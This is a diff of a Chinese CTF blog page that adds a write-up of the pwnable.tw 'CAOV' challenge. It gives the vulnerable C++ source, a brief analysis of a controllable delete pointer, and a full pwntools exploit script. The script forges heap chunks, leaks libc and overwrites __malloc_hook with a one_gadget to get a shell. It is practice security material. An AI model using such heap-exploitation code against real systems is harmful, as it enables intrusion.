@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ABf1ag-blog/source_posts/pwnable-tw刷题记录/image-20211103201504616.png">
 <meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108110017579.png">
 <meta property="article:published_time" content="2021-10-21T13:56:20.000Z">
-<meta property="article:modified_time" content="2021-11-08T03:50:05.639Z">
+<meta property="article:modified_time" content="2021-11-23T09:09:50.305Z">
 <meta property="article:author" content="ABf1ag">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png">
@@ -201,7 +201,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-11-08 11:50:05" itemprop="dateModified" datetime="2021-11-08T11:50:05+08:00">2021-11-08</time>
+                <time title="Modified: 2021-11-23 17:09:50" itemprop="dateModified" datetime="2021-11-23T17:09:50+08:00">2021-11-23</time>
               </span>
 
           
@@ -378,6 +378,73 @@ dele(4)
 io.interactive()
 </code></pre>
 <p>exp()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 10.CAOV</span><br><span class="line"></span><br><span class="line">近段时间遇到了好多C++pwn题，但由于太菜，每次都看不懂，因此想在网上找C++pwn题的源码对照ida学习c++pwn，但网上的这种资料太少,四处碰壁后还是靠企鹅才找到了源码。以下是源码。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>/* g++ -std=c++11 -Wl,-z,relro,-z,now -o caov caov.cpp */</p>
+<p>#include &lt;bits/stdc++.h&gt;<br>#include &lt;unistd.h&gt;</p>
+<p>using namespace std;</p>
+<p>class Data;</p>
+<p>Data *D;<br>char name[160];</p>
+<p>class Data<br>{<br>    public:<br>        Data():key(NULL) , value(0), change_count(0){ init_time(); }<br>        Data(string k, int v)<br>        {<br>            key = new char[k.length() + 1];<br>            strcpy(key, k.c_str());<br>            value = v;<br>            change_count = 0;<br>            update_time();<br>        }<br>        Data(const Data &amp;obj)<br>        {<br>            key = new char[strlen(obj.key)+1];<br>            strcpy(key, obj.key);<br>            value = obj.value;<br>            change_count = obj.change_count;<br>            year  = obj.year;<br>            month = obj.month;<br>            day   = obj.day;<br>            hour  = obj.hour;<br>            min   = obj.min;<br>            sec   = obj.sec;<br>        }<br>        Data operator=(const Data &amp;rhs)<br>        {<br>            key = new char[strlen(rhs.key)+1];<br>            strcpy(key, rhs.key);<br>            value = rhs.value;<br>            change_count = rhs.change_count;<br>            year  = rhs.year;<br>            month = rhs.month;<br>            day   = rhs.day;<br>            hour  = rhs.hour;<br>            min   = rhs.min;<br>            sec   = rhs.sec;<br>        }<br>        void edit_data()<br>        {<br>            if(change_count == 10)<br>            {<br>                cout &lt;&lt; “You can only edit your data 10 times at most.” &lt;&lt; endl;<br>                cout &lt;&lt; “Bye ._.\~/“ &lt;&lt; endl;<br>                exit(0);<br>            }<br>            int old_len = strlen(key);<br>            unsigned int new_len = 0;<br>            cout &lt;&lt; “New key length: “;<br>            cin  &gt;&gt; new_len;<br>            getchar();<br>            if(new_len == 0 || new_len &gt; 1000)<br>            {<br>                cout &lt;&lt; “Invalid key length” &lt;&lt; endl;<br>                return;<br>            }<br>            if (new_len &gt; old_len) key = new char[new_len+1];<br>            set_data(new_len);<br>            change_count += 1;<br>        }<br>        void set_data(unsigned int n)<br>        {<br>            cout &lt;&lt; “Key: “;<br>            cin.getline(key, n+1); // read n byte + 1 null byte ( auto append )<br>            cout &lt;&lt; “Value: “;<br>            cin &gt;&gt; value;<br>            getchar();<br>            update_time();<br>        }<br>        void update_time()<br>        {<br>            time_t cur_time = time(NULL);<br>            struct tm *now = localtime(&amp;cur_time);<br>            year = now-&gt;tm_year + 1900;<br>            month = now-&gt;tm_mon + 1;<br>            day = now-&gt;tm_mday;<br>            hour = now-&gt;tm_hour;<br>            min = now-&gt;tm_min;<br>            sec = now-&gt;tm_sec;<br>        }<br>        void info()<br>        {<br>            cout &lt;&lt; “Key: “ &lt;&lt; key &lt;&lt; endl;<br>            cout &lt;&lt; “Value: “ &lt;&lt; value &lt;&lt; endl;<br>            cout &lt;&lt; “Edit count: “ &lt;&lt; change_count &lt;&lt; endl;<br>            cout &lt;&lt; “Last update time: “;<br>            printf(“%d-%d-%d %d:%d:%d\n”, year, month, day, hour, min, sec);<br>        }<br>        ~Data()<br>        {<br>            delete[] key;<br>            key = nullptr;<br>            value = 0;<br>            change_count = 0;<br>            init_time();<br>        }</p>
+<pre><code>private:
+    char *key;
+    long value;
+    long change_count;
+    int year;
+    int month;
+    int day;
+    int hour;
+    int min;
+    int sec;
+    void init_time()
+    &#123;
+        year  = 0;
+        month = 0;
+        day   = 0;
+        hour  = 0;
+        min   = 0;
+        sec   = 0;
+    &#125;
+</code></pre>
+<p>};</p>
+<p>void set_name()<br>{<br>    char tmp[160]={};<br>    char c;<br>    cout &lt;&lt; “Enter your name: “;<br>    int cnt = 0;<br>    while(1)<br>    {<br>        int len = read(0, &amp;c, 1);<br>        if(len != 1)<br>        {<br>            cout &lt;&lt; “Read error” &lt;&lt; endl;<br>            exit(-1);<br>        }<br>        tmp[cnt++] = c;<br>        if(c == ‘\n’ || cnt == 150)<br>        {<br>            tmp[cnt-1] = ‘\0’;<br>            break;<br>        }<br>    }<br>    memcpy(name, tmp, cnt);<br>}</p>
+<p>void edit()<br>{<br>    Data old;<br>    old = *D;<br>    D-&gt;edit_data();<br>    cout &lt;&lt; “\nYour data info before editing:” &lt;&lt; endl;<br>    old.info();<br>    cout &lt;&lt; “\nYour data info after editing:” &lt;&lt; endl;<br>    D-&gt;info();<br>}</p>
+<p>void playground()<br>{<br>    int choice = 0;<br>    while(1)<br>    {<br>        cout &lt;&lt; “\nMenu” &lt;&lt; endl;<br>        cout &lt;&lt; “1. Show name &amp; data” &lt;&lt; endl;<br>        cout &lt;&lt; “2. Edit name &amp; data” &lt;&lt; endl;<br>        cout &lt;&lt; “3. Exit” &lt;&lt; endl;<br>        cout &lt;&lt; “Your choice: “;<br>        cin &gt;&gt; choice;<br>        getchar();<br>        switch(choice)<br>        {<br>            case 1:<br>                cout &lt;&lt; “\nYour name is : “&lt;&lt; name &lt;&lt; endl;<br>                cout &lt;&lt; “Your data :” &lt;&lt; endl;<br>                D-&gt;info();<br>                break;<br>            case 2:<br>                set_name();<br>                edit();<br>                break;<br>            case 3:<br>                cout &lt;&lt; “Bye !” &lt;&lt; endl;<br>                return;<br>            default:<br>                cout &lt;&lt; “Invalid choice !” &lt;&lt; endl;<br>                exit(0);<br>        }<br>    }<br>}</p>
+<p>int main(int argc, char *argv[])<br>{<br>    setvbuf(stdin,0, 2, 0);<br>    setvbuf(stdout,0, 2, 0);<br>    setvbuf(stderr,0, 2, 0);</p>
+<pre><code>string k;
+long v;
+
+set_name();
+cout &lt;&lt; &quot;Hello ! &quot; &lt;&lt; name &lt;&lt; &quot; !&quot; &lt;&lt; endl;
+cout &lt;&lt; &quot;Welcome to Simple key-value DB playground !&quot; &lt;&lt; endl;
+cout &lt;&lt; &quot;Please input a key: &quot;;
+cin &gt;&gt; k;
+cout &lt;&lt; &quot;Please input a value: &quot;;
+cin &gt;&gt; v;
+
+D = new Data(k, v);
+cout &lt;&lt; &quot;Data create success !&quot; &lt;&lt; endl;
+cout &lt;&lt; &quot;Now you can play with your data ^_^&quot; &lt;&lt; endl;
+
+playground();
+
+return 0;
+</code></pre>
+<p>}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本题的漏洞点在dele的指针是我们可以控制的</span><br><span class="line"></span><br><span class="line">![image-20211123170418374](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170418374.png)</span><br><span class="line"></span><br><span class="line">可以看到v4距离ebp0x50的位置</span><br><span class="line"></span><br><span class="line">![image-20211123170522368](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170522368.png)</span><br><span class="line"></span><br><span class="line">和他共用一个栈帧的函数其中src是我们可控的，也就是说v4可控，因此我们就能够伪造chunk了。</span><br><span class="line"></span><br><span class="line">![image-20211123170611044](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170611044.png)</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *<br>#io=process(‘./caov’)<br>io=remote(‘chall.pwnable.tw’,10306)<br>elf=ELF(‘./caov’)<br>#libc=elf.libc<br>libc=ELF(‘./libc_64.so.6’)<br>context.log_level=’debug’</p>
+<p>def add(name,key,value):<br>    io.sendlineafter(‘Enter your name: ‘,name)<br>    io.sendlineafter(‘input a key: ‘,key)<br>    io.sendlineafter(‘input a value: ‘,value)</p>
+<p>def edit(name,length,key,value):<br>    io.sendlineafter(‘Your choice: ‘,’2’)<br>    io.sendlineafter(‘Enter your name: ‘,name)<br>    io.sendlineafter(‘New key length: ‘,str(length))<br>    io.sendafter(‘Key: ‘,key)<br>    io.sendlineafter(‘Value: ‘,value)</p>
+<p>def show():<br>    io.sendlineafter(‘Your choice: ‘,’1’)</p>
+<p>def exp():<br>    add(‘f1ag’,’a’*0x10,’10’)<br>    payload=p64(0)+p64(0x71)<br>    payload=payload.ljust(0x60,’\x00’)<br>    edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x7,’b\n’,’20’)<br>    edit(p64(0)+p64(0x71)+p64(0x603288-3),0x67,’c\n’,’30’)<br>    edit(p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10),0x67,’a’*0xb+p64(0x603300)+’\n’,’30’)<br>    addr=u64(io.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))<br>    libc_base=addr-libc.symbols[‘<em>IO_2_1_stderr</em>‘]<br>    print(‘libc_base’,hex(libc_base))<br>    free_hook=libc_base+libc.symbols[‘__free_hook’]<br>    system=libc_base+libc.symbols[‘system’]<br>    malloc_hook=libc_base+libc.symbols[‘__malloc_hook’]<br>    gadget=[0x45216,0x4526a,0xef6c4,0xf0567]    </p>
+<pre><code>payload=p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10)+p64(0)
+payload=payload.ljust(0x60,&#39;\x00&#39;)    
+edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x10,&#39;\n&#39;,&#39;20&#39;)
+edit(p64(0)+p64(0x71)+p64(malloc_hook-0x23),0x67,&#39;\n&#39;,&#39;1&#39;)
+#gdb.attach(io)
+edit(p64(0)+p64(0x71),0x67,&#39;a&#39;*0x13+p64(gadget[2]+libc_base)+&#39;\n&#39;,&#39;2&#39;)
+io.interactive()
+</code></pre>
+<p>exp()</p>
 <pre><code>
 </code></pre>
 
@@ -474,7 +541,7 @@ io.interactive()
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
